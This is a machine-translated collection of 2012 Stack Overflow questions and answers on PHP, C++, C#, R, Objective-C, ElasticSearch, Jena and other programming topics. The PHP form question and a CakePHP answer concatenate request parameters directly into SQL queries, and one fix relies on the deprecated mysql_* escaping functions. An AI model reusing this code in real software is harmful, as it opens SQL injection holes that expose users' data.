> 时间：2012-08-30T11:35:49.257

你可以得到一个组件clientId`#{component.clientId}`

更多信息请参见此处：[如何在 jquery 中引用 JSF 组件 ID？](https://stackoverflow.com/questions/7132061/how-to-refer-to-a-jsf-component-id-in-jquery)

[在 JSF 2.0 中检索其他组件的客户端 ID](https://stackoverflow.com/questions/12124727/retrieving-other-components-client-id-in-jsf-2-0)

[http://java.dzone.com/articles/jsf-20-clientid-jquery](http://java.dzone.com/articles/jsf-20-clientid-jquery)

# r - R中的t检验错误

> ID：12192889
> 
> 赞同：1
> 
> 时间：2012-08-30T08:32:47.687
> 
> 标签：r

以下是我使用该`multtest`包查找差异表达基因的矩阵。

```
ID_REF     GSM362168 GSM362169 GSM362170 GSM362171 GSM362172 GSM362173 GSM362174      
244901_at   5.171072  5.207896  5.191145  5.067809  5.010239  5.556884  4.879528      
244902_at   5.296012  5.460796  5.419633  5.440318  5.234789  7.567894  6.908795 
```

我使用的代码是

```
cl<-c(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
      0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
      1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)
stat <- mt.teststat(conthyp,classlabel=cl,test="t.equalvar") 
```

`conthyp`matic在哪里，`cl`是`classlabel`. 我收到以下错误

> 错误：C 堆栈使用量太接近限制

我不确定我在哪里犯了错误。

# php - 如何在 PHP 的最后一个数组中递归地添加一个额外的子数组

> ID：12192890
> 
> 赞同：2
> 
> 时间：2012-08-30T08:32:57.440
> 
> 标签：php, arrays, loops, multidimensional-array, foreach

我正在尝试将另一个子数组添加到最后一个子数组。

这是我的数组的示例，

```
Array
(
    [Auto-Trail] => Array
        (
            [name] => Auto-Trail
            [children] => Array
                (
                    [2001] => Array
                        (
                            [name] => 2001
                            [children] => Array
                                (
                                    [Tracker] => Array
                                        (
                                            [name] => Tracker
                                            [children] => Array
                                                (
                                                    [CK] => Array
                                                        (
                                                            [name] => CK
                                                            [children] => Array
                                                                (
                                                                    [Fiat] => Array
                                                                        (
                                                                            [name] => Fiat
                                                                        )

                                                                )

                                                        )

                                                    [EK] => Array
                                                        (
                                                            [name] => EK
                                                            [children] => Array
                                                                (
                                                                    [Fiat] => Array
                                                                        (
                                                                            [name] => Fiat
                                                                        )

                                                                )

                                                        )

                                                )

                                        )

                                    [Cheyenne] => Array
                                        (
                                            [name] => Cheyenne
                                            [children] => Array
                                                (
                                                    [630S] => Array
                                                        (
                                                            [name] => 630S
                                                            [children] => Array
                                                                (
                                                                    [Fiat] => Array
                                                                        (
                                                                            [name] => Fiat
                                                                        )

                                                                    [Merc] => Array
                                                                        (
                                                                            [name] => Merc
                                                                            [children] => Array
                                                                                (
                                                                                    [313] => Array
                                                                                        (
                                                                                            [name] => 313
                                                                                        )

                                                                                    [316] => Array
                                                                                        (
                                                                                            [name] => 316
                                                                                        )

                                                                                )

                                                                        )

                                                                )

                                                        )

                                                    [630] => Array
                                                        (
                                                            [name] => 630
                                                            [children] => Array
                                                                (
                                                                    [Fiat] => Array
                                                                        (
                                                                            [name] => Fiat
                                                                        )

                                                                    [Merc] => Array
                                                                        (
                                                                            [name] => Merc
                                                                            [children] => Array
                                                                                (
                                                                                    [313] => Array
                                                                                        (
                                                                                            [name] => 313
                                                                                        )

                                                                                    [316] => Array
                                                                                        (
                                                                                            [name] => 316
                                                                                        )

                                                                                )

                                                                        )

                                                                )

                                                        )

                                                    [634] => Array
                                                        (
                                                            [name] => 634
                                                            [children] => Array
                                                                (
                                                                    [Fiat] => Array
                                                                        (
                                                                            [name] => Fiat
                                                                        )

                                                                    [Merc] => Array
                                                                        (
                                                                            [name] => Merc
                                                                            [children] => Array
                                                                                (
                                                                                    [313] => Array
                                                                                        (
                                                                                            [name] => 313
                                                                                        )

                                                                                    [316] => Array
                                                                                        (
                                                                                            [name] => 316
                                                                                        )

                                                                                )

                                                                        )

                                                                )

                                                        )

                                                    [634U] => Array
                                                        (
                                                            [name] => 634U
                                                            [children] => Array
                                                                (
                                                                    [Fiat] => Array
                                                                        (
                                                                            [name] => Fiat
                                                                        )

                                                                    [Merc] => Array
                                                                        (
                                                                            [name] => Merc
                                                                            [children] => Array
                                                                                (
                                                                                    [313] => Array
                                                                                        (
                                                                                            [name] => 313
                                                                                        )

                                                                                    [316] => Array
                                                                                        (
                                                                                            [name] => 316
                                                                                        )

                                                                                )

                                                                        )

                                                                )

                                                        ) 
```

这是我希望添加到每个最后一个元素的数组，

例如，我需要将以下内容添加到 [CK][children][Fiat][children] （以及每个最后一个孩子的孩子） - 这个数组将是静态的，每个最后一个孩子都将使用相同的数组。

```
[BOF] => Array
    (
        [name] => Furniture
    )

[CHA] => Array
    (
        [name] => Chassis
    ) 
```

所以... ][CK][children][Fiat] 会变成下面这样，

```
 [CK] => Array
                                                (
                                                    [name] => CK
                                                    [children] => Array
                                                        (
                                                            [Fiat] => Array
                                                                (
                                                                    [name] => Fiat
                                                                        [children] => Array
                                                                            (
                                                                                [BOF] => Array
                                                                                    (
                                                                                        [name] => Furniture
                                                                                    )

                                                                                [CHA] => Array
                                                                                    (
                                                                                        [name] => Chassis
                                                                                    )
                                                                            )
                                                                )

                                                        )

                                                ) 
```

请注意，并非每个最后一个孩子的缩进级别都相同，可能还有 10 个孩子缩进。它必须使用每个数组的数组中的最后一个数组。

抱歉，如果很难理解，我正在努力准确地说出我需要它的工作方式。

感谢您的时间和精力。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T10:30:24.097

看看这个解决方案（quick'n'dirty）：

```
function injectArray(array $target, array $inject, $depth = 0){
    $hasChildrenKey = array_key_exists('children', $target);
    $hasChildren = $hasChildrenKey && !empty($target['children']);

    if($depth % 2 == 0){
        foreach($target as $k => $v)
            if(is_array($v))
                $target[$k] = injectArray($v, $inject, $depth+1);
    }
    elseif(!$hasChildren){
        if(!$hasChildrenKey)    
            $target['children'] = array();
        $target['children'] = array_merge_recursive($target['children'], $inject);
    }
    else if($hasChildrenKey){
        $target['children'] = injectArray($target['children'], $inject, $depth+1);
    }
    return $target;
};

$testArray = array(
    'Auto-Trail' => array('name' => 'asdf', 
        'children' => array(
            '2001' => array('name' => '2001',
                'children' => array(
                    'Tracker' => array('name' => 'Tracker',
                        'children' =>   array(
                            'CK' => array('name' => 'CK',
                                'children' => array(
                                    'Fiat' => array('name' => 'Fiat')
                                )
                            )
                        )                               
                    )
                )
            )
        )
    )
);

$testInjectArray = array('BOF' => array('name' => 'Furniture'), 'CHA' => array('name' => 'Chassis'));

$result = injectArray($testArray, $testInjectArray);
print_r($result); 
```

# cakephp - CakePHP 模型中只有一个 tinyint 正数

> ID：12192891
> 
> 赞同：0
> 
> 时间：2012-08-30T08:32:59.473
> 
> 标签：cakephp, model, tinyint

在我的模型中，我们称之为“问题”，我有“活动”字段（TINYINT）。这个想法是，该特定模型中只有一个条目可以处于活动状态。因此，当我通过选中“活动”复选框来更新一个条目时，该条目应该变为活动状态，而另一个应该变为非活动状态（我的意思是之前一直处于活动状态的那个）。知道我应该使用什么查询吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T09:01:13.790

例如某种切换行为。您编写的这种行为使模型`$actsAs = array('Toggable', array('field'=>'active'));`

并在您的 afterSave 挂钩中进行 updateAll 调用以将所有活动的重置为非活动的（当然当前 id 除外）

那将是最干净的方法。当然，您总是可以为此使用模型钩子本身制作一个快速而肮脏的模型。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T11:18:46.943

我不知道该怎么做。这略高于我目前的知识:)

到目前为止，这就是我的想法：

```
function admin_edit($id = null) {
        $this->Question->id = $id;

        if (empty($this->data)) {
            $this->data = $this->Question->read();
        } else {

            if ($this->Question->save($this->data)) {
                $active = $this->data['Question']['active'];
                $total = $this->Question->find('count');
                $i=1;

                if ($i == '1') {
                    while($active <= $total){
                        $this->Question->query("UPDATE questions SET active = '0'");
                        $i++;
                    }

                    $this->Question->query("UPDATE questions SET active = '1' WHERE id = '$id'");
                }

                $this->redirect(array('action' => 'index'));
            }

        } 
```

它正在工作，但我想这不是“最干净的方法”。任何提示如何简化它之后？

# objective-c - ObjC 中最快的：IsEqualToString:@"" 或长度 > 0？

> ID：12192894
> 
> 赞同：3
> 
> 时间：2012-08-30T08:33:22.417
> 
> 标签：objective-c, ios

我想知道哪一个对于测试 iOS 7.0+ 的非空 NSString 最快。
注意：要测试的字符串 99% 的时间是 2 到 100 个字符长度。

```
if ([foo length] > 0) 
```

或者

```
if ([foo isEqualToString:@""] == NO && foo != nil) 
```

我认为这取决于是`isEqualToString:`先比较长度（在这种情况下第一种方法更快）还是`isEqualToString:`先比较字符串的第一个字符（在这种情况下第二种方法可能更快）。

ps：我已经知道`isEqualToString:`is 快于`isEqual:`which is 本身快于`compare:`.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T08:39:25.333

测量一下看看。

严重地。你不应该优化这样的东西，除非你能看到它实际上是一个性能瓶颈（这不太可能）。如果仪器（使用时间分析器）告诉您这是一个问题，那么正确的方法是衡量您的假设。

生成 n 百万个随机字符串，使用选项 A 对代码进行计时，然后使用选项 B 并选择最快的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-30T09:02:34.887

简单地测试长度会快很多倍（在我测试的系统上）。

当然，您依赖于框架实现。

您可能会考虑一个可以提高可读性的功能，如果“快速方式”发生变化，您将只有 2 行需要更改。

* * *

在下面的评论中，我建议使用常量/奇异/唯一字符串进行比较是最快的。

*   `isEqualToString:`仅72 岁
*   22.6s总是测试`length`
*   15.6s 指针比较，否则测试`length`（测试中的一半元素匹配常量）。如果您的集合的某些空字符串是常量，但有些不是常量，这将适用。可以根据集合中常数的分布而变化。
*   4.6 仅指针比较

使用指针比较比测试长度快 5 倍，比`isEqualToString:`. 当然，您可能需要在创建数组时增加一些开销，以确保所有空字符串都是常量。

# c++ - （在 C++11 中）std::vector::resize(size_type) 是否应该适用于默认的可构造 value_type int[4]？

> ID：12192895
> 
> 赞同：11
> 
> 时间：2012-08-30T08:33:22.570
> 
> 标签：c++, c++11, stdvector, default-constructor

在 C++11 中，有两个版本`std::vector::resize()`：

```
void resize( size_type count );
void resize( size_type count, const value_type& value); 
```

[我理解（正如对此问题](https://stackoverflow.com/questions/12184828/compiler-error-with-c-stdvector-of-array)的其中一个答案的评论之一所建议的那样）第一个要求`value_type`是默认可构造的，而第二个要求它是可复制构造的。但是，（gcc 4.7.0）

```
using namespace std;
typedef int block[4];
vector<block> A;
static_assert(is_default_constructible<block>::value,";-("); //  does not fire
A.resize(100);                                               //  compiler error 
```

所以要么我的理解是错误的，要么 gcc 有问题。哪个？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-30T08:49:12.967

`vector.resize(n)`格式良好的要求 (23.3.6.3:10)`T`应该是*`CopyInsertable`*，即以下内容应该是格式良好的 (23.2.1:13)：

```
allocator_traits<A>::construct(m, p, v); 
```

其中`A`是向量的分配器类型，`m`是分配器，`p`是类型`T *`，`v`是类型`T`。

正如您从 20.6.8.2:5 中发现的那样，这在一般情况下对数组类型无效，因为它等效于调用

```
::new(static_cast<void *>(p))block(v); 
```

这对数组类型无效（数组不能用括号初始化）。

* * *

实际上，您是正确的 g++ 有一个错误；*`CopyInsertable`*通过提供适当的分配器应该总是可以解决这个问题，但是 g++ 不允许这样做：

```
#include <vector>

template<typename T, int n> struct ArrayAllocator: std::allocator<T[n]> {
    void construct(T (*p)[n], T (&v)[n]) {
        for (int i = 0; i < n; ++i)
            ::new(static_cast<void *>(p + i)) T{v[i]};
    }
};

int main() {
    std::vector<int[4], ArrayAllocator<int, 4>> c;
    c.resize(100);  // fails

    typedef ArrayAllocator<int, 4> A;
    A m;
    int (*p)[4] = 0, v[4];
    std::allocator_traits<A>::construct(m, p, v); // works
} 
```

* * *

另一个错误在于标准本身。20.9.4.3:3 指定`std::is_default_constructible<T>` 为等效于`std::is_constructible<T>`，其中 20.9.4.3:6 指定`std::is_constructible<T, Args...>`为 上的良构性标准`T t(std::declval<Args>()...)`，这对数组类型有效（正如@Johannes Schaub-litb 指出的那样，数组类型可以用 初始化*`(zero-pack-expansion)`*）。但是，17.6.3.1:2 还要求格式正确`DefaultConstructible`，`T()`数组类型并非如此，`T`但`std::is_default_constructible`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-12-02T08:22:47.823

在遇到 resize() 不适用于默认可构造类型的类似问题后，我发现了这个讨论。似乎 gcc 向量实现不正确。

仅供参考，我针对 gcc 提交了一个错误： [https ://gcc.gnu.org/bugzilla/show_bug.cgi?id=64147](https://gcc.gnu.org/bugzilla/show_bug.cgi?id=64147)

# c# - 如何从客户端脚本访问参数

> ID：12192897
> 
> 赞同：2
> 
> 时间：2012-08-30T08:33:30.183
> 
> 标签：c#, javascript, asp.net, gridview

我有一个 Gridview 和 rowDatabound 我正在创建单击该行并显示模式弹出窗口。我想要的是当单击该行时，应该传递该行的 ID。

```
protected void grdOrderProduct_RowDataBound(object sender, GridViewRowEventArgs e)
{
    if (e.Row.RowType == DataControlRowType.DataRow)
    {
        e.Row.Attributes.Add("onmouseover", "this.style.backgroundColor='#ceedfc'");
        e.Row.Attributes.Add("onmouseout", "this.style.backgroundColor=''");
        e.Row.Attributes.Add("style", "cursor:pointer;");
        e.Row.Attributes["onClick"] = Page.ClientScript.GetPostBackClientHyperlink(btnPop, "12");
    }
} 
```

我怎样才能在我的服务器控件上获取这个“12”。我已将 12 作为静态演示。但它会改变。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T12:01:57.373

you also can do like this

```
e.Row.Attributes["onclick"] = ClientScript.GetPostBackClientHyperlink
(this.GridView1, "Select$" + e.Row.RowIndex); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T09:02:25.267

要知道点击了哪一行，您必须`Row`使用`GridViewRowEventArgs`

```
 protected void grdOrderProduct_RowDataBound(object sender, GridViewRowEventArgs e)
    {
        if (e.Row.RowType == DataControlRowType.DataRow)
        {
            e.Row.Attributes.Add("onmouseover", "this.style.backgroundColor='#ceedfc'");
            e.Row.Attributes.Add("onmouseout", "this.style.backgroundColor=''");
            e.Row.Attributes.Add("style", "cursor:pointer;");
            e.Row.Attributes["onClick"] = Page.ClientScript.GetPostBackClientHyperlink(btnPop, e.Row.RowIndex.ToString());

        }
    } 
```

RowIndex 将作为参数传递给`btnPop`. 为了接收它`btnPop`应该执行`IPostBackEventHandler`。

像这样：

```
public class MyControl : Button, IPostBackEventHandler
  {

    // Use the constructor to defined default label text.
    public MyControl()
    {
    }

    // Implement the RaisePostBackEvent method from the
    // IPostBackEventHandler interface. 
    public void RaisePostBackEvent(string eventArgument)
    {
      //You receive the row number here.
    }
  } 
```

参考[ClientScriptManager.GetPostBackClientHyperlink](http://ClientScriptManager.GetPostBackClientHyperlink)

# php - PHP：如何从返回数组的函数中读取值

> ID：12192901
> 
> 赞同：1
> 
> 时间：2012-08-30T08:33:41.920
> 
> 标签：php, arrays, function, get

所以我有形式：

```
 <form method="post">
    Name: <input type="text" name="name" value<? if(isset($_GET['edit'])) {echo '="'. person($_GET['edit']) .'"';} ?>/><br>
    Surname: <input type="text" name="surname" value<? if(isset($_GET['edit'])) {echo '="'. person($_GET['edit']) .'"';} ?>/><br>       
    Age: <input type="text" name="age" value<? if(isset($_GET['edit'])) {echo '="'. person($_GET['edit']) .'"';} ?>/><br>
    <input type="submit" value="Submit" name="submit"/> 
</form> 
```

和

```
 function person($id) {
    $query = 'SELECT name, sname, age FROM persons WHERE ID='.$id.';';
    $result = mysql_query($query);
    return $row = mysql_fetch_row($result);
} 
```

所以函数返回一个数组，我怎样才能从这个函数中得到只显示我：每个输入值中的'name'/'sname'/'age'

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-30T08:39:19.980

首先使用[mysql_fetch_assoc](http://www.php.net/manual/en/function.mysql-fetch-assoc.php)作为使用字母键。

然后你可以在最新版本的 PHP 中这样做：

```
person($id)['name'] 
```

或者在旧版本的 PHP 中定义单独的数组：

```
$personData = person($id);
$name = $personData['name']; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T08:36:53.760

它就像一个普通的数组，所以你可以使用[id]。如果您使用 mysql_fetch_row 它必须是从 0 到 n-1 的数字，其中 n 是数组中的项目数，以便您在查询中执行。如果你有 mysql_fetch_assoc，你可以使用 $test['name']、$test['sname']、$test['age']。

```
$test = person(5);

echo $test[0].$test[1].$test[2]; //will show name|sname|age (withouth '|'). 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:37:03.040

```
$per=person('12'); 
```

获取姓名 name, sname, age

```
$per[0] for name, $per[1] for sname and $per[2] for age; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-30T08:51:45.417

```
$data = person($id);
$name = $data['name']; 
```

但是你应该在你的 sql 语句中使用它们之前转义你的参数！至少做一些类似的事情：

```
<?php $_GET['edit'] = mysql_real_escape_string($_GET['edit']); ?>
<form method="post">
Name: <input type="text" name="name" value<? if(isset($_GET['edit'])) {echo '="'.person($_GET['edit']) .'"';} ?>/><br>
 ...... 
```

# c# - 在 Pivotviewer 中绑定两个不同的集合源

> ID：12192903
> 
> 赞同：1
> 
> 时间：2012-08-30T08:33:53.997
> 
> 标签：c#, silverlight, data-binding, silverlight-5.0, pivotviewer

我试图了解如何在 pivotviewer 中管理两个集合之间的转换。集合具有相同的图像，只是处理了一个集合。我想让一个集合消失到另一个集合中。

我知道如何通过固定 maxwidth 来定义不同的模板。例如，一旦您放大了 300 像素，那么您就有了新模板，直到达到 500 像素，等等。我用来绑定我在后面的代码中加载的集合的代码是这样的：

```
<pv:PivotViewerItemTemplate x:Key="firstTemplate" MaxWidth="300">
    <!-- template layout -->
    <pv:PivotViewerMultiScaleSubImageHost CollectionSource="{Binding [VisualCollectionSource][0] }"  ImageId="{Binding [VisualImageId][0]}" />
    <!-- template layout -->
</pv:PivotViewerItemTemplate> 
```

我可以采用[这样](https://stackoverflow.com/questions/5445790/multiple-itemssource-collection-bindings)的解决方案吗？它的最佳做法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-05T00:46:36.293

这是一个在加载的 CXML 集合之间保持重叠而不是替换整个集合的示例。由于添加和删除对象时有动画，它看起来很不错。从服务器/后端请求更多/部分数据时很有用。（当然，这与缩放时“褪色的集合/项目”无关。）

最有趣的代码是 in `KeepIntersection(this ICollection<PivotViewerItem> currentItems, CxmlCollectionSource newItems)`，它通过仅添加和删除旧集合和新集合的差异来修改集合。

[`ObservableCollection`](https://www.google.com/?q=pivotviewer+observablecollection)根据[Tony Champions](http://tonychampion.net/blog/index.php/category/silverlight/pivotviewer-silverlight/)和[Chris Arnold](http://goodcoffeegoodcode.wordpress.com/category/technology/programming/silverlight/pivotviewer/)的教程/帖子，基于 Silverlight 5 PivotViewer 。

## MainPageViewModel.cs

```
private void CxmlCollectionSource_StateChanged(object sender, CxmlCollectionStateChangedEventArgs e)
{
    // TODO: check other states
    switch (e.NewState)
    {
        case CxmlCollectionState.Loaded:
            {
                var collection = sender as CxmlCollectionSource;

                Debug.Assert(collection != null, "collection != null");

                // TODO: don't add/remove, replace the entire list after diffing
                if (!this.pivotProperties.Any())
                {
                    // TODO: diffing algorithm for properties, minimal changes
                    foreach (var pivotViewerProperty in collection.ItemProperties)
                    {
                        this.pivotProperties.Add(pivotViewerProperty);
                    }
                }

                this.pivotViewerItems.KeepIntersection(collection);

                break;
            }
    }
} 
```

## ICollection{PivotViewerItem}Extensions.cs

```
namespace SilverlightPivotViewer.Extensions
{
    #region Using directives

    using System.Collections.Generic;
    using System.Linq;
    using System.Windows.Controls.Pivot;

    #endregion

    public static class ICollectionPivotViewerItemExtensions
    {
        #region Public Methods and Operators

        public static void KeepIntersection(
            this ICollection<PivotViewerItem> currentItems, CxmlCollectionSource newItems)
        {
            RemoveCurrentUniqueItems(currentItems, newItems);

            AddNewUniqueItems(currentItems, newItems);
        }

        #endregion

        #region Methods

        private static void AddNewUniqueItems(ICollection<PivotViewerItem> currentItems, CxmlCollectionSource newItems)
        {
            IEnumerable<PivotViewerItem> onlyInNewCollection =
                newItems.Items.Where(pivotViewerItem => currentItems.All(i => i.Id != pivotViewerItem.Id));

            foreach (var pivotViewerItem in onlyInNewCollection)
            {
                currentItems.Add(pivotViewerItem);
            }
        }

        private static void RemoveCurrentUniqueItems(
            ICollection<PivotViewerItem> currentItems, CxmlCollectionSource newItems)
        {
            IEnumerable<PivotViewerItem> onlyInCurrentCollection =
                currentItems.Where(pivotViewerItem => newItems.Items.All(i => i.Id != pivotViewerItem.Id));

            // Need to produce a list, otherwise it will crash (concurrent looping and editing the IEnumerable, or something related)
            var onlyInCurrentCollectionList = onlyInCurrentCollection.ToList();

            foreach (var pivotViewerItem in onlyInCurrentCollectionList)
            {
                currentItems.Remove(pivotViewerItem);
            }
        }

        #endregion
    }
} 
```

*   编码的自定义差异函数，但我确信有人有一个很棒的库可以做到这一点。
*   也考虑为方面类别添加差异，但它不是为此而构建的。我想推荐的方法是确保客户端知道所有可用的类别，以便它们可以用于过滤。

# android - 手机间隙返回键控制

> ID：12192908
> 
> 赞同：1
> 
> 时间：2012-08-30T08:34:18.407
> 
> 标签：android, html, cordova

我想在单击后退按钮时弹出一个弹出窗口。现在使用我的代码后退按钮被禁用，但它没有发出警报消息。

```
function load()
{
document.addEventListener("backbutton", backKeyDown, false);
function backKeyDown() {console.log("PhoneGap Ready!");}
}

<body onLoad="load()">
</body> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T09:06:55.817

你可以这样使用。

```
function load()
{
document.addEventListener("backbutton", backKeyDown, false);
}

function backKeyDown() {

navigator.notification.alert(
            'You are the winner!',  // message
            alertDismissed,         // callback
            'Game Over',            // title
            'Done'                  // buttonName
        );
}

function alertDismissed(){
history.back();
} 
```

# ruby-on-rails - ElasticSearch 评分（轮胎宝石）

> ID：12192913
> 
> 赞同：4
> 
> 时间：2012-08-30T08:34:31.313
> 
> 标签：ruby-on-rails, ruby, full-text-search, elasticsearch, tire

我希望 ElasticSearch（具体是轮胎 gem）根据关键字在字段中出现的次数返回结果。例如，我在一个名为 Article 的模型中索引字段**标题**。我有两个对象，第一个对象的**标题**值为*'Funny Funny subject'*而第二个对象的标题值为*'Funny subject'*。我想以这样的方式建立索引，如果我搜索关键字**'Funny'**，第一个对象将首先返回，因为它有两个 'Funny' 出现在标题中的单词。可以通过轮胎做到这一点吗？索引方法又叫什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T13:42:47.090

这是一个工作示例，这里的关键因素是 boostvalue 必须足够高，并且您不能在查询中使用通配符。

```
require 'tire'
require 'yajl/json_gem'

articles = [
  { :id => '0', :type => 'article', :title => 'nothing funny'},
  { :id => '1', :type => 'article', :title => 'funny'},
  { :id => '2', :type => 'article', :title => 'funny funny funny'}
]

Tire.index 'articles' do
  import articles
end

Tire.index 'articles' do
  delete

  create :mappings => {
    :article => {
      :properties => {
        :id       => { :type => 'string', :index => 'not_analyzed', :include_in_all => false },
        :title    => { :type => 'string', :boost => 50.0,            :analyzer => 'snowball'  },
        :tags     => { :type => 'string', :analyzer => 'keyword'                             },
        :content  => { :type => 'string', :analyzer => 'snowball'                            }
      }
    }
  }

  import articles do |documents|
    documents.map { |document| document.update(:title => document[:title].downcase) }
  end

  refresh
end

s = Tire.search('articles') do
  query do
    string "title:funny"
  end
end

s.results.each do |document|
  puts "* id:#{ document.id } #{ document.title } score: #{document._score}"
end 
```

给

```
* id:2 funny funny funny score: 14.881571
* id:1 funny score: 14.728935
* id:0 nothing funny score: 9.81929 
```

# c# - 带有 C# 项目的 Visual Studio 12 Professional 中的编译问题

> ID：12192914
> 
> 赞同：15
> 
> 时间：2012-08-30T08:34:31.763
> 
> 标签：c#, visual-studio-2012, .net-4.5

该项目在 Visual Studio 2010 中运行良好，我们升级到 Visual Studio 2012；但是，现在它无法编译。

我们收到以下错误：

> 错误 2 任务无法使用 SdkToolsPath“”或注册表项“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SDKs\Windows\v8.0A\WinSDK-NetFx40Tools-x86”找到“AL.exe”。确保设置了 SdkToolsPath 并且该工具存在于 SdkToolsPath 下的正确处理器特定位置，并且安装了 Microsoft Windows SDK PROJECT_NAME

有谁如何解决这个问题？

我在安装了 .NET 4.5 的 Windows 2008 R2 SP1 上。我没有直接安装 .NET 4，我使用了 .NET 4.5 安装程序。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-01-04T12:07:59.390

[我通过从http://msdn.microsoft.com/en-us/windows/hardware/hh852363.aspx](http://msdn.microsoft.com/en-us/windows/hardware/hh852363.aspx)安装“适用于 Windows 8 的 Windows 软件开发工具包 (SDK)”来解决此问题

我被标题弄糊涂了——我在 Windows 7 上——但它确实有效。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-07-03T07:03:21.893

Mark Rainey 指出的解决方案为我们工作：http: [//www.markrainey.me/2013/02/setting-up-build-machine.html](http://www.markrainey.me/2013/02/setting-up-build-machine.html)

> 更改 SDK 版本
> 
> ```
> Go to "Microsoft Windows SDK v7.1" from the Start menu
> Select "Windows SDK 7.1 Command Prompt" and enter
> > cd Setup
> > WindowsSdkVer -version:v7.1 
> ```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-04-28T16:15:12.360

我的问题是单击配置`Properties`的解决方案时`Active(Debug)`，我的项目的配置设置为`Release`. 将其更改为`Debug`, rebuilt 并且构建错误消失了。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-07-05T19:45:56.623

2013 年之后，现在 msbuild 是 VS 的一部分。

[https://blogs.msdn.microsoft.com/visualstudio/2013/07/24/msbuild-is-now-part-of-visual-studio/](https://blogs.msdn.microsoft.com/visualstudio/2013/07/24/msbuild-is-now-part-of-visual-studio/)

在我的情况下，我必须在安装 VS2015 后更改 msbuild 路径

C:\Program 文件 (x86)\MSBuild\14.0\Bin\

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-04-17T05:44:34.977

“我通过从[http://msdn.microsoft.com/en-us/windows/hardware/hh852363.aspx](http://msdn.microsoft.com/en-us/windows/hardware/hh852363.aspx)安装“适用于 Windows 8 的 Windows 软件开发工具包 (SDK)”来解决此问题“

user489998 的这个解决方案在 Windows server 2008 R2 上也能正常工作。

# java - 我无法访问对象属性

> ID：12192915
> 
> 赞同：2
> 
> 时间：2012-08-30T08:34:35.180
> 
> 标签：java, rdf, jena, object-properties

我正在使用 Java 和 Jena API。我有一个***婚姻类***，它有 3 个对象属性，称为“ **hasHusband** ”、“ **Haswife** ”和“ **dateOfMarriage** ”。前两个与具有数据类型属性的***类 Person*****相关联，例如hasFirstName**、**hasLastName**、**dateOfBirth** ...。

我想访问对象属性“Haswife”和“hasHusband”，然后是妻子的名字和丈夫的名字。

**这是我的 rdf 文件中的表示方式：**

(...)

```
 <j.0:FAMmariage rdf:about=http://www.fam.com/FAM#BrunoCatherine> 

  <j.0:FAMaDateMariage>25/07/2011</j.0:FAMaDateMariage>

   <j.0:FAMhasWife>
     <rdf:Description rdf:about="http://www.fam.com/FAM#Catherine20/03/1982">
       <j.0:FAMDateOfBirth>20/03/1980</j.0:FAMDateOfBirth>
       <j.0:FAMHasName>Gomez</j.0:FAMHasName>
       <j.0:FAMHasFirstName>Catherine</j.0:FAMHasFirstName>
    </rdf:Description>
  </j.0:FAMHasWife>

   <j.0:FAMHusband>
     <rdf:Description rdf:about="http://www.fam.com/FAM# Bruno15/06/1980 ">
       <j.0:FAMaDateOfBirth>15/06/1980 </j.0:FAMDateOfBirth>
       <j.0:FAMHasName>Jeandet </j.0:FAMHasName>
       <j.0:FAMHasFirstName>Bruno</j.0:FAMHasFirstName>
     </rdf:Description>
   </j.0:FAMHusband>

 </j.0:FAMmariage>
(...) 
```

**我试过这样但它仍然不起作用：**

```
StmtIterator iter = onto.model.listStatements();  
    while (iter.hasNext()) {
        Statement stmt = iter.nextStatement();  
        Resource  subject = stmt.getSubject();     
        Property  predicate = stmt.getPredicate();   
        RDFNode   object = stmt.getObject();
        if (predicate.equals(onto.hasWife))
        {       
           System.out.print(" " + object.toString() + " ");
        }
  } 
```

你能告诉我有什么问题吗？

谢谢

**已编辑**

更多有用的细节：

(...)

```
person = model.createClass(uriBase+"person");
person.addSubClass(man);
person.addSubClass(woman);
marriage = model.createClass(uriBase+"marriage"); 
```

(...)

```
hasHusband = model.createObjectProperty(uriBase+"hasHusband");
hasHusband.setDomain(marriage);
hasHusband.setRange(man);

hasWife = model.createObjectProperty(uriBase+"hasWife");
hasWife.setDomain(marriage);
hasWife.setRange(woman);

hasFirstName = model.createDatatypeProperty(uriBase+"hasFirstName"); 
hasFirstName.setDomain(person);
hasFirstName.setRange(XSD.xstring); 
```

(...)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T09:21:07.337

那样有用吗 ？

```
ont.hasWife=model.createProperty("your namespace URI here","FAMhasWife");

StmtIterator iter = onto.model.listStatements(null,onto.hasWife,(RDFNode)null);  
    while (iter.hasNext()) {
        Statement stmt = iter.nextStatement();  

           System.out.print(stmt.getObject().toString());
  } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-30T09:40:53.133

根据您提供的信息，不可能确切地知道问题出在哪里。您可能在其中一个 URI 中犯了错误，无论是在您的数据中还是在您的程序中。您的问题是命名术语不一致。

